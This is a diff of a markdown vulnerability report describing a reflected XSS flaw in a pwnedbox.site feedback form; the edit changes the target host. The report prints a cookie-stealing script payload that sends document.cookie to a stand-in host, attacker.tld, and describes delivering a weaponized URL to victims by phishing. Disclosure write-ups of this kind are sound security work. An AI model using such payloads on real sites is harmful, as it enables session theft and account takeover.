@@ -17,7 +17,7 @@ An unauthenticated Reflected Cross-Site Scripting (XSS) vulnerability exists in 
   cybrnoob'"<><Script>fetch('https://attacker.tld/steal?c='+document.cookie)</Script>
 ```
 ## POC / Steps to Reproduce
-1. Interact with the text box and observe whether the input `cybrnoob'"<>` is reflected in the source.
+1. Interact with the text box at `https://feedback.pwnedbox.site/` and observe whether the input `cybrnoob'"<>` is reflected in the source.
     <img width="756" height="491" alt="SCR-20261121-rxvg" src="https://github.com/user-attachments/assets/bd8e65e5-7375-4114-88bf-d9af7057dbe4" />
 2. Inject the javascript in the text box to see if it is executed.
    - Here it can be seen that the `<script>` tag is being filtered.
@@ -34,7 +34,7 @@ An unauthenticated Reflected Cross-Site Scripting (XSS) vulnerability exists in 
      - Here it can be seen that the injected payload executes seamlessly.
      <img width="756" height="491" alt="SCR-20261121-tpud" src="https://github.com/user-attachments/assets/63488f6f-1e61-44c4-8851-31814e8d7069" />
       <img width="756" height="491" alt="SCR-20261121-tpog" src="https://github.com/user-attachments/assets/5e304df4-4454-42bb-9502-e24b6ea89245" />
-3. Craft a weaponized URL (e.g., `https://search.pwnedbox.site/?fname=&lname=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.
+3. Craft a weaponized URL (e.g., `https://feedback.pwnedbox.site/?fname=&lname=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.
 
 ## Impact / Risk
 1. An attacker can steal session cookies and impersonate the victim.
